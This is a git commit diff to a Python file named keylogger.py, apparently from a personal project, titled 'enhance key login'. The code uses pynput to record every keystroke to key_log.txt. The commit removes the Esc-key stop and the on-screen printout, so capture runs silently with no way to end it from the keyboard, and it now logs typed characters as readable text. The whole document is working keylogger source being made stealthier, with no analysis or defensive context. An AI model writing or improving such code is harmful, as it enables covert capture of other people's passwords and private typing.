eea0a932daab8aaac285e166d9506840c6481143
ThArInDu0621 <lakmal8442tharindu@gmail.com>
2025-04-24 22:32:17 +0530

    enhance key login

--- project/keylogger.py
+++ project/keylogger.py
@@ -1,28 +1,23 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-count = 0
 keys = []
 def press(key):
-    global keys,count
+    global keys
     keys.append(key)
-    count += 1
-    print("{0} Pressed".format(key))
-
-    if count >= 1:
-        count=0
-        write_file(str(keys))
-        keys=[]
+    write_file(keys)
+    keys =[]
 
 def release(key):
-    if key==Key.esc:
-        return False
+    pass
 
 def write_file(keys):
     with open("key_log.txt", "a") as f:
         for key in keys:
-            if key==Key.space:
-                f.write('/n')
+            if key == Key.space:
+                f.write('\n')
+            elif hasattr(key, 'char'):
+                f.write(key.char)
             else:
                 f.write(str(key))
 
